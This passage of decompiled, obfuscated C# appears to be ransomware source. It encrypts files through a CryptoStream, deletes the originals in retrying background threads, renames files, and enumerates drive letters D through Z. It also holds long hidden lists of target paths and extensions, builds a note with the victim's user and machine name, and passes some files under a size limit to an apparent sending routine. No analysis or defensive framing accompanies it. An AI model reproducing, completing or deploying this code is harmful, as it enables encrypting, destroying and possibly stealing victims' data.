					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.fRxskrnPHhc.Length > 0)
				{
					if (bxhZXFvKXZl == getString_0(107396836))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in EKjYgfCTgvyfhvOPx)
						{
							if (CS_0024_003C_003E8__locals0.atoCyWSfKSy.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107396836))
							{
								if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388604), getString_0(107388599), getString_0(107388618), CS_0024_003C_003E8__locals0.atoCyWSfKSy);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.atoCyWSfKSy.ToLower().EndsWith(item) && vEWBFQaTPDgk == getString_0(107396996))
							{
								try
								{
									LRKYNOUdGHN.qatkvmOGuIr(getString_0(107388604), getString_0(107388599), getString_0(107388618), CS_0024_003C_003E8__locals0.atoCyWSfKSy);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.atoCyWSfKSy);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.fRxskrnPHhc.EndsWith(getString_0(107385830)))
					{
						File.Move(CS_0024_003C_003E8__locals0.fRxskrnPHhc, CS_0024_003C_003E8__locals0.fRxskrnPHhc.Replace(getString_0(107385830), getString_0(107388555)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.fRxskrnPHhc))
							{
								File.Delete(CS_0024_003C_003E8__locals0.fRxskrnPHhc);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107385584) + CS_0024_003C_003E8__locals0.atoCyWSfKSy + getString_0(107385789) + ex2.Message + getString_0(107396237));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__8()
	{
		List<string> source = iSGwXCiIfXBR;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385768)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		List<string> source2 = jFoYvbvoLRCagvDFmn;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385723)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		if (tMTGisYcNMVHo == getString_0(107396836))
		{
			string[] source3 = tPINiNFcqTnZtQ;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
				{
					tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385723)), getString_0(107385730) + string_0 + getString_0(107385177));
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		if (!ProlBhJTlUdn().Contains(getString_0(107385962)))
		{
			WbYRPqkvADfNl(AbUTAcXZWDez);
		}
		else
		{
			List<string> bSHtnNKwjXivMJS = BSHtnNKwjXivMJS;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
				{
					tLMiMedPBjRN(PhXjLAIdTCy(XvbRsShmdArZzku(getString_0(107385172))), string_0);
				};
			}
			Parallel.ForEach(bSHtnNKwjXivMJS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		}
		List<string> source4 = hkXnlfpoGpnf;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385147)), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385768)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385723)), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385723)), getString_0(107385730) + string_0 + getString_0(107385177));
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		tLMiMedPBjRN(PhXjLAIdTCy(XvbRsShmdArZzku(getString_0(107385172))), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385147)), string_0);
	}

	private static void _003CMapDrv_003Eb__1c(string string_0)
	{
		srrHuxcqQLoZC CS_0024_003C_003E8__locals0 = new srrHuxcqQLoZC();
		CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf = string_0;
		if ((!CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf.StartsWith(getString_0(107385162)) && !CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf.StartsWith(getString_0(107385157)) && !CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf.StartsWith(getString_0(107385116)) && !CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf.StartsWith(getString_0(107388555))) || !dBSQTvAQfYhhe.pqxLdPrWdAai(CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf))
		{
			return;
		}
		try
		{
			Thread.Sleep(rHOZvgFGaXKMdexR);
			HoHveMjVjvX.Add(getString_0(107387552) + CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf + getString_0(107385135));
			try
			{
				if (qoRjYABduZF)
				{
					Console.WriteLine(getString_0(107387552) + CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf + getString_0(107385135));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(rHOZvgFGaXKMdexR);
				HoHveMjVjvX.Add(srrHuxcqQLoZC.getString_0(107387559) + CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf + srrHuxcqQLoZC.getString_0(107397116) + (char)int_0 + srrHuxcqQLoZC.getString_0(107402592));
				try
				{
					if (qoRjYABduZF)
					{
						Console.WriteLine(srrHuxcqQLoZC.getString_0(107387559) + CS_0024_003C_003E8__locals0.PWgItyVYDrnlaJwQf + srrHuxcqQLoZC.getString_0(107397116) + (char)int_0 + srrHuxcqQLoZC.getString_0(107402592));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static GRQFeQGQfBG()
	{
		Strings.CreateGetStringDelegate(typeof(GRQFeQGQfBG));
		tTTuIqIyTVsKt = getString_0(107388966);
		lrVhqMPbYlaOK = null;
		kvJFoDYMuC = getString_0(107396996);
		cJvZgRMCiiT = getString_0(107385126);
		HoHveMjVjvX = new List<string>();
		YtNGHYTThvg = new List<string>();
		YsJopGaPpPETyH = getString_0(107396996);
		nyAmnOdcSzzfJ = getString_0(107388555);
		AFNtNBdAhEf = getString_0(107388555);
		zcPzHRZXYSoC = getString_0(107396996);
		PNgOzFQmoBxwkpD = 0;
		cySCSfjuDKIn = getString_0(107396996);
		mfIGHgxpUFhf = getString_0(107396996);
		vCBJiLpGmJSnD = getString_0(107396996);
		ARhmLIZgWToPak = getString_0(107385081);
		HUAsnTLTOzrk = getString_0(107396996);
		TaRSuIXzPFDe = getString_0(107396996);
		EBwCzzKShZJF = getString_0(107396836);
		xRKOGhAaTewo = getString_0(107396996);
		vooFhNgKVZyUs = new List<string>
		{
			PhXjLAIdTCy(getString_0(107385076)),
			PhXjLAIdTCy(getString_0(107385091)),
			PhXjLAIdTCy(getString_0(107385066)),
			PhXjLAIdTCy(getString_0(107385017)),
			PhXjLAIdTCy(getString_0(107384992)),
			PhXjLAIdTCy(getString_0(107384999)),
			PhXjLAIdTCy(getString_0(107384950)),
			PhXjLAIdTCy(getString_0(107385437)),
			PhXjLAIdTCy(getString_0(107385444)),
			PhXjLAIdTCy(getString_0(107385419)),
			PhXjLAIdTCy(getString_0(107385370)),
			PhXjLAIdTCy(getString_0(107385377)),
			PhXjLAIdTCy(getString_0(107385352))
		};
		SlSeSNfJnzNh = new List<string>();
		gqVCQVtJiavX = getString_0(107396996);
		oLgSSCEqAmbBry = getString_0(107396996);
		zSIqMRAKpkZZcGjv = getString_0(107396996);
		yGkMwQPqUdXIj = new List<string>();
		MSHRwSPpwmqxM = getString_0(107396996);
		FAZqQTFurwccxTs = getString_0(107385327);
		iEHeKlEPYHGI = getString_0(107396836);
		xYvGfyjIeZ = getString_0(107396996);
		ZSNcfBFfJEfqQ = new List<string>
		{
			PhXjLAIdTCy(getString_0(107385246)),
			PhXjLAIdTCy(getString_0(107385213)),
			PhXjLAIdTCy(getString_0(107384668)),
			PhXjLAIdTCy(getString_0(107384635)),
			PhXjLAIdTCy(getString_0(107384602)),
			PhXjLAIdTCy(getString_0(107384573)),
			PhXjLAIdTCy(getString_0(107384548)),
			PhXjLAIdTCy(getString_0(107384519)),
			PhXjLAIdTCy(getString_0(107384442)),
			PhXjLAIdTCy(getString_0(107384889)),
			PhXjLAIdTCy(getString_0(107384856)),
			PhXjLAIdTCy(getString_0(107384823)),
			PhXjLAIdTCy(getString_0(107384790)),
			PhXjLAIdTCy(getString_0(107384761)),
			PhXjLAIdTCy(getString_0(107384732)),
			PhXjLAIdTCy(getString_0(107384691)),
			PhXjLAIdTCy(getString_0(107384170)),
			PhXjLAIdTCy(getString_0(107384081)),
			PhXjLAIdTCy(getString_0(107384032)),
			PhXjLAIdTCy(getString_0(107383999)),
			PhXjLAIdTCy(getString_0(107384002)),
			PhXjLAIdTCy(getString_0(107383929)),
			PhXjLAIdTCy(getString_0(107384432)),
			PhXjLAIdTCy(getString_0(107384399)),
			PhXjLAIdTCy(getString_0(107384318)),
			PhXjLAIdTCy(getString_0(107384293)),
			PhXjLAIdTCy(getString_0(107384220)),
			PhXjLAIdTCy(getString_0(107384191)),
			PhXjLAIdTCy(getString_0(107383638)),
			PhXjLAIdTCy(getString_0(107383581)),
			PhXjLAIdTCy(getString_0(107383516)),
			PhXjLAIdTCy(getString_0(107383491)),
			PhXjLAIdTCy(getString_0(107383426)),
			PhXjLAIdTCy(getString_0(107383857)),
			PhXjLAIdTCy(getString_0(107383824)),
			PhXjLAIdTCy(getString_0(107383735)),
			PhXjLAIdTCy(getString_0(107383702)),
			PhXjLAIdTCy(getString_0(107383693)),
			PhXjLAIdTCy(getString_0(107383140)),
			PhXjLAIdTCy(getString_0(107383063)),
			PhXjLAIdTCy(getString_0(107383034)),
			PhXjLAIdTCy(getString_0(107382969)),
			PhXjLAIdTCy(getString_0(107382960)),
			PhXjLAIdTCy(getString_0(107382927)),
			PhXjLAIdTCy(getString_0(107383398)),
			PhXjLAIdTCy(getString_0(107383317)),
			PhXjLAIdTCy(getString_0(107383304)),
			PhXjLAIdTCy(getString_0(107383199)),
			PhXjLAIdTCy(getString_0(107383154)),
			PhXjLAIdTCy(getString_0(107382629)),
			PhXjLAIdTCy(getString_0(107382552)),
			PhXjLAIdTCy(getString_0(107382543)),
			PhXjLAIdTCy(getString_0(107382470)),
			PhXjLAIdTCy(getString_0(107382441)),
			PhXjLAIdTCy(getString_0(107382880)),
			PhXjLAIdTCy(getString_0(107382815)),
			PhXjLAIdTCy(getString_0(107382770)),
			PhXjLAIdTCy(getString_0(107382741)),
			PhXjLAIdTCy(getString_0(107382728)),
			PhXjLAIdTCy(getString_0(107382663)),
			PhXjLAIdTCy(getString_0(107382122)),
			PhXjLAIdTCy(getString_0(107382033)),
			PhXjLAIdTCy(getString_0(107382000)),
			PhXjLAIdTCy(getString_0(107381959)),
			PhXjLAIdTCy(getString_0(107381930)),
			PhXjLAIdTCy(getString_0(107381889)),
			PhXjLAIdTCy(getString_0(107382320)),
			PhXjLAIdTCy(getString_0(107382227)),
			PhXjLAIdTCy(getString_0(107382186)),
			PhXjLAIdTCy(getString_0(107381597)),
			PhXjLAIdTCy(getString_0(107381564)),
			PhXjLAIdTCy(getString_0(107381523)),
			PhXjLAIdTCy(getString_0(107381478)),
			PhXjLAIdTCy(getString_0(107381401)),
			PhXjLAIdTCy(getString_0(107381824)),
			PhXjLAIdTCy(getString_0(107381807)),
			PhXjLAIdTCy(getString_0(107381746)),
			PhXjLAIdTCy(getString_0(107381737)),
			PhXjLAIdTCy(getString_0(107381672)),
			PhXjLAIdTCy(getString_0(107381079)),
			PhXjLAIdTCy(getString_0(107381022)),
			PhXjLAIdTCy(getString_0(107380989)),
			PhXjLAIdTCy(getString_0(107380928)),
			PhXjLAIdTCy(getString_0(107380903)),
			PhXjLAIdTCy(getString_0(107383735)),
			PhXjLAIdTCy(getString_0(107381358)),
			PhXjLAIdTCy(getString_0(107381317)),
			PhXjLAIdTCy(getString_0(107381228)),
			PhXjLAIdTCy(getString_0(107381151)),
			PhXjLAIdTCy(getString_0(107381122)),
			PhXjLAIdTCy(getString_0(107413353)),
			PhXjLAIdTCy(getString_0(107413276)),
			PhXjLAIdTCy(getString_0(107413259)),
			PhXjLAIdTCy(getString_0(107383581)),
			PhXjLAIdTCy(getString_0(107413194)),
			PhXjLAIdTCy(getString_0(107413153)),
			PhXjLAIdTCy(getString_0(107413608)),
			PhXjLAIdTCy(getString_0(107383516)),
			PhXjLAIdTCy(getString_0(107413503)),
			PhXjLAIdTCy(getString_0(107413486)),
			PhXjLAIdTCy(getString_0(107413365)),
			PhXjLAIdTCy(getString_0(107412788)),
			PhXjLAIdTCy(getString_0(107412771)),
			PhXjLAIdTCy(getString_0(107383426)),
			PhXjLAIdTCy(getString_0(107412662)),
			PhXjLAIdTCy(getString_0(107383702)),
			PhXjLAIdTCy(getString_0(107383857)),
			PhXjLAIdTCy(getString_0(107412629)),
			PhXjLAIdTCy(getString_0(107413084)),
			PhXjLAIdTCy(getString_0(107383824)),
			PhXjLAIdTCy(getString_0(107413051)),
			PhXjLAIdTCy(getString_0(107413034)),
			PhXjLAIdTCy(getString_0(107412953)),
			PhXjLAIdTCy(getString_0(107383638)),
			PhXjLAIdTCy(getString_0(107412928)),
			PhXjLAIdTCy(getString_0(107412883)),
			PhXjLAIdTCy(getString_0(107412854)),
			PhXjLAIdTCy(getString_0(107412313)),
			PhXjLAIdTCy(getString_0(107412300)),
			PhXjLAIdTCy(getString_0(107412267)),
			PhXjLAIdTCy(getString_0(107412210)),
			PhXjLAIdTCy(getString_0(107412197)),
			PhXjLAIdTCy(getString_0(107412172)),
			PhXjLAIdTCy(getString_0(107412131)),
			PhXjLAIdTCy(getString_0(107412566)),
			PhXjLAIdTCy(getString_0(107412549)),
			PhXjLAIdTCy(getString_0(107412492)),
			PhXjLAIdTCy(getString_0(107412459)),
			PhXjLAIdTCy(getString_0(107412382)),
			PhXjLAIdTCy(getString_0(107412349)),
			PhXjLAIdTCy(getString_0(107411796)),
			PhXjLAIdTCy(getString_0(107384191)),
			PhXjLAIdTCy(getString_0(107412549)),
			PhXjLAIdTCy(getString_0(107411787)),
			PhXjLAIdTCy(getString_0(107411758)),
			PhXjLAIdTCy(getString_0(107411697)),
			PhXjLAIdTCy(getString_0(107411648)),
			PhXjLAIdTCy(getString_0(107411607)),
			PhXjLAIdTCy(getString_0(107412058)),
			PhXjLAIdTCy(getString_0(107411985)),
			PhXjLAIdTCy(getString_0(107411956)),
			PhXjLAIdTCy(getString_0(107411923)),
			PhXjLAIdTCy(getString_0(107411882)),
			PhXjLAIdTCy(getString_0(107411853)),
			PhXjLAIdTCy(getString_0(107411264)),
			PhXjLAIdTCy(getString_0(107411199)),
			PhXjLAIdTCy(getString_0(107411166)),
			PhXjLAIdTCy(getString_0(107411121)),
			PhXjLAIdTCy(getString_0(107411060)),
			PhXjLAIdTCy(getString_0(107411539)),
			PhXjLAIdTCy(getString_0(107411526)),
			PhXjLAIdTCy(getString_0(107411461)),
			PhXjLAIdTCy(getString_0(107411428)),
			PhXjLAIdTCy(getString_0(107411355)),
			PhXjLAIdTCy(getString_0(107411338)),
			PhXjLAIdTCy(getString_0(107384318)),
			PhXjLAIdTCy(getString_0(107410797)),
			PhXjLAIdTCy(getString_0(107410708)),
			PhXjLAIdTCy(getString_0(107410699)),
			PhXjLAIdTCy(getString_0(107410622)),
			PhXjLAIdTCy(getString_0(107410581)),
			PhXjLAIdTCy(getString_0(107410568)),
			PhXjLAIdTCy(getString_0(107411019)),
			PhXjLAIdTCy(getString_0(107410938)),
			PhXjLAIdTCy(getString_0(107410921)),
			PhXjLAIdTCy(getString_0(107410864)),
			PhXjLAIdTCy(getString_0(107410263)),
			PhXjLAIdTCy(getString_0(107410250)),
			PhXjLAIdTCy(getString_0(107410209)),
			PhXjLAIdTCy(getString_0(107410152)),
			PhXjLAIdTCy(getString_0(107384293)),
			PhXjLAIdTCy(getString_0(107410047)),
			PhXjLAIdTCy(getString_0(107410050)),
			PhXjLAIdTCy(getString_0(107410529)),
			PhXjLAIdTCy(getString_0(107410456)),
			PhXjLAIdTCy(getString_0(107410427)),
			PhXjLAIdTCy(getString_0(107384399)),
			PhXjLAIdTCy(getString_0(107410386)),
			PhXjLAIdTCy(getString_0(107410369)),
			PhXjLAIdTCy(getString_0(107410340)),
			PhXjLAIdTCy(getString_0(107382122)),
			PhXjLAIdTCy(getString_0(107410307)),
			PhXjLAIdTCy(getString_0(107410340)),
			PhXjLAIdTCy(getString_0(107409766)),
			PhXjLAIdTCy(getString_0(107409737)),
			PhXjLAIdTCy(getString_0(107409708)),
			PhXjLAIdTCy(getString_0(107409627)),
			PhXjLAIdTCy(getString_0(107409610)),
			PhXjLAIdTCy(getString_0(107409569)),
			PhXjLAIdTCy(getString_0(107410020)),
			PhXjLAIdTCy(getString_0(107409991)),
			PhXjLAIdTCy(getString_0(107409918)),
			PhXjLAIdTCy(getString_0(107409873)),
			PhXjLAIdTCy(getString_0(107409860)),
			PhXjLAIdTCy(getString_0(107409827)),
			PhXjLAIdTCy(getString_0(107409258)),
			PhXjLAIdTCy(getString_0(107409181)),
			PhXjLAIdTCy(getString_0(107409156)),
			PhXjLAIdTCy(getString_0(107409123)),
			PhXjLAIdTCy(getString_0(107409050)),
			PhXjLAIdTCy(getString_0(107409021)),
			PhXjLAIdTCy(getString_0(107409472)),
			PhXjLAIdTCy(getString_0(107409439)),
			PhXjLAIdTCy(getString_0(107409414)),
			PhXjLAIdTCy(getString_0(107409341)),
			PhXjLAIdTCy(getString_0(107409324)),
			PhXjLAIdTCy(getString_0(107409291)),
			PhXjLAIdTCy(getString_0(107408698)),
			PhXjLAIdTCy(getString_0(107408685)),
			PhXjLAIdTCy(getString_0(107408604)),
			PhXjLAIdTCy(getString_0(107408591)),
			PhXjLAIdTCy(getString_0(107408510)),
			PhXjLAIdTCy(getString_0(107408989)),
			PhXjLAIdTCy(getString_0(107408948)),
			PhXjLAIdTCy(getString_0(107408939)),
			PhXjLAIdTCy(getString_0(107408862)),
			PhXjLAIdTCy(getString_0(107411607)),
			PhXjLAIdTCy(getString_0(107408829)),
			PhXjLAIdTCy(getString_0(107408788)),
			PhXjLAIdTCy(getString_0(107408219)),
			PhXjLAIdTCy(getString_0(107408190)),
			PhXjLAIdTCy(getString_0(107408157)),
			PhXjLAIdTCy(getString_0(107408124)),
			PhXjLAIdTCy(getString_0(107408107)),
			PhXjLAIdTCy(getString_0(107408078)),
			PhXjLAIdTCy(getString_0(107408033)),
			PhXjLAIdTCy(getString_0(107408468)),
			PhXjLAIdTCy(getString_0(107408459)),
			PhXjLAIdTCy(getString_0(107408370)),
			PhXjLAIdTCy(getString_0(107408353)),
			PhXjLAIdTCy(getString_0(107408324)),
			PhXjLAIdTCy(getString_0(107408247))
		};
		iSGwXCiIfXBR = new List<string>
		{
			PhXjLAIdTCy(getString_0(107407726)),
			PhXjLAIdTCy(getString_0(107407645)),
			PhXjLAIdTCy(getString_0(107407628)),
			PhXjLAIdTCy(getString_0(107407547)),
			PhXjLAIdTCy(getString_0(107407530)),
			PhXjLAIdTCy(getString_0(107407977)),
			PhXjLAIdTCy(getString_0(107407868)),
			PhXjLAIdTCy(getString_0(107407807))
		};
		jFoYvbvoLRCagvDFmn = new List<string>
		{
			PhXjLAIdTCy(getString_0(107407782)),
			PhXjLAIdTCy(getString_0(107407749)),
			PhXjLAIdTCy(getString_0(107407160)),
			PhXjLAIdTCy(getString_0(107407143)),
			PhXjLAIdTCy(getString_0(107407110)),
			PhXjLAIdTCy(getString_0(107407029)),
			PhXjLAIdTCy(getString_0(107407016)),
			PhXjLAIdTCy(getString_0(107406983)),
			PhXjLAIdTCy(getString_0(107407462)),
			PhXjLAIdTCy(getString_0(107407429)),
			PhXjLAIdTCy(getString_0(107407396)),
			PhXjLAIdTCy(getString_0(107407363)),
			PhXjLAIdTCy(getString_0(107407290)),
			PhXjLAIdTCy(getString_0(107407249)),
			PhXjLAIdTCy(getString_0(107407236)),
			PhXjLAIdTCy(getString_0(107406691)),
			PhXjLAIdTCy(getString_0(107406618)),
			PhXjLAIdTCy(getString_0(107406585)),
			PhXjLAIdTCy(getString_0(107406576)),
			PhXjLAIdTCy(getString_0(107406535)),
			PhXjLAIdTCy(getString_0(107406502)),
			PhXjLAIdTCy(getString_0(107406941)),
			PhXjLAIdTCy(getString_0(107406908)),
			PhXjLAIdTCy(getString_0(107407782)),
			PhXjLAIdTCy(getString_0(107406867)),
			PhXjLAIdTCy(getString_0(107406858)),
			PhXjLAIdTCy(getString_0(107406781)),
			PhXjLAIdTCy(getString_0(107406748)),
			PhXjLAIdTCy(getString_0(107406707)),
			PhXjLAIdTCy(getString_0(107406186)),
			PhXjLAIdTCy(getString_0(107406153)),
			PhXjLAIdTCy(getString_0(107406080)),
			PhXjLAIdTCy(getString_0(107406039)),
			PhXjLAIdTCy(getString_0(107407749)),
			PhXjLAIdTCy(getString_0(107406030)),
			PhXjLAIdTCy(getString_0(107407160)),
			PhXjLAIdTCy(getString_0(107405997)),
			PhXjLAIdTCy(getString_0(107405964)),
			PhXjLAIdTCy(getString_0(107406435)),
			PhXjLAIdTCy(getString_0(107406402)),
			PhXjLAIdTCy(getString_0(107406329)),
			PhXjLAIdTCy(getString_0(107406320)),
			PhXjLAIdTCy(getString_0(107406287)),
			PhXjLAIdTCy(getString_0(107406254)),
			PhXjLAIdTCy(getString_0(107406213)),
			PhXjLAIdTCy(getString_0(107405628)),
			PhXjLAIdTCy(getString_0(107405587))
		};
		BSHtnNKwjXivMJS = new List<string>
		{
			PhXjLAIdTCy(XvbRsShmdArZzku(getString_0(107405578))),
			PhXjLAIdTCy(getString_0(107405497)),
			PhXjLAIdTCy(getString_0(107405916)),
			PhXjLAIdTCy(getString_0(107405819)),
			PhXjLAIdTCy(getString_0(107405726)),
			PhXjLAIdTCy(getString_0(107405117)),
			PhXjLAIdTCy(getString_0(107405024)),
			PhXjLAIdTCy(getString_0(107404927)),
			PhXjLAIdTCy(getString_0(107405378)),
			PhXjLAIdTCy(getString_0(107405281)),
			PhXjLAIdTCy(getString_0(107405188)),
			PhXjLAIdTCy(getString_0(107404579)),
			PhXjLAIdTCy(getString_0(107404486)),
			PhXjLAIdTCy(XvbRsShmdArZzku(getString_0(107405578)))
		};
		AbUTAcXZWDez = PhXjLAIdTCy(getString_0(107404901));
		hkXnlfpoGpnf = new List<string>
		{
			PhXjLAIdTCy(getString_0(107404756)),
			PhXjLAIdTCy(getString_0(107404050)),
			PhXjLAIdTCy(getString_0(107404400)),
			PhXjLAIdTCy(getString_0(107404206)),
			PhXjLAIdTCy(getString_0(107403500)),
			PhXjLAIdTCy(getString_0(107403818))
		};
		gNbydKfEzpWjv = new List<string>
		{
			PhXjLAIdTCy(getString_0(107403112)),
			PhXjLAIdTCy(getString_0(107403051)),
			PhXjLAIdTCy(getString_0(107402990))
		};
		apDKFRuernzH = getString_0(107396996);
		rmnvFBReavI = getString_0(107396996);
		mfBqYHSOySd = new DateTime(2000, 1, 1);
		mvolkwWivlBcrm = new DateTime(2100, 1, 1);
		CdQMIPJOkrOUDSy = getString_0(107396836);
		xYkYbBCyjIxz = getString_0(107385933);
		eIevaseXuHQaH = getString_0(107396996);
		bdIGvvMoxCbM = getString_0(107396996);
		TuoGtjjIwGaoMFyS = getString_0(107396996);
		ofNBDRGhqfTF = getString_0(107396836);
		kdEfNQYswVmDU = getString_0(107396996);
		bxhZXFvKXZl = getString_0(107396996);
		EKjYgfCTgvyfhvOPx = new List<string>
		{
			getString_0(107395704),
			getString_0(107395418),
			getString_0(107395738),
			getString_0(107395331)
		};
		vEWBFQaTPDgk = getString_0(107396996);
		PyFcFDpqJkSW = getString_0(107402897);
		MIRuXWVFFoLwtz = getString_0(107396836);
		VsxmPTvejQSFs = getString_0(107396996);
		ZxaKxHsjfdsdTvNKy = getString_0(107396996);
		KtQjokjXHZXUlt = string.Empty;
		nvUGpJjfEl = getString_0(107396996);
		esDOwQNWzCks = getString_0(107396996);
		RzJDQuVkTCTlk = getString_0(107396996);
		vKUIQhdzgPHwb = getString_0(107388555);
		GfViqMwSHVEX = getString_0(107388555);
		IUCNbNITnGCo = getString_0(107396996);
		sQphlXbTpcR = getString_0(107396836);
		ltuxRtIPjttT = getString_0(107396836);
		aDFaQrSzgBxEj = getString_0(107396996);
		nLNEEVaUjoQklOdfI = getString_0(107396996);
		anwdjQbJZQFrk = getString_0(107402924);
		PxoomWcCvZubT = getString_0(107396996);
		NRDQBoJkcw = getString_0(107396996);
		LIbWxYpDOmPy = getString_0(107402875);
		rHeEvpAbjCjyvEaC = getString_0(107396996);
		NfiNMrNQVxA = getString_0(107396996);
		JOmKsEZdamZ = getString_0(107396836);
		befQPNWerVGdKp = getString_0(107396996);
		aEpEnRRNDPnpp = getString_0(107402890);
		QArBXOfqRoEA = getString_0(107396836);
		QGAYpwMzxm = getString_0(107396836);
		cbYwmSYgAK = getString_0(107396996);
		tMTGisYcNMVHo = getString_0(107396996);
		tPINiNFcqTnZtQ = new string[0];
		POXokwFKrkkHxdVH = getString_0(107396996);
		VGKELVlTFUV = true;
		ZHbEFyHPlfyw = getString_0(107396996);
		IooTTsvIiwCN = true;
		fOGrPeGaBiaPoAHL = false;
		MVhCfgBRSEUkeJ = false;
		NBgAYvhpqTo = false;
		jnRLNtXuRRg = getString_0(107403357);
		joesCNAxeHUI = false;
		XqTYpFCObzAK = false;
		WmBMdIXNbOD = true;
		upflSQRmeWP = false;
		EcdpqbMrQOzfdgL = true;
		diaHTfOFnw = getString_0(107403368) + Environment.UserName + getString_0(107403323) + Environment.MachineName + getString_0(107403334) + LRKYNOUdGHN.mJPfHItsLp() + getString_0(107403329);
		qoRjYABduZF = false;
		uYmJJOwnKLBSZO = new Stopwatch();
		iePhSHBTqLd = 0;
		XnicJWCgBOO = 0;
		MiZHZrKmtKkaPXn = false;
		RBZnAGRnuwHeRmi = getString_0(107403288) + LRKYNOUdGHN.mJPfHItsLp() + getString_0(107403311);
		sohDoFMGJgbq = new string[1] { getString_0(107403306) };
		HXQxyzlRKB = new List<string>();
		rHOZvgFGaXKMdexR = 0;
		ttBolWBjlrOWveAHe = new List<string>();
		iMRzWeevHnmPma = new List<string>();
		isoUHjZdYowniZ = new List<string>();
	}
}
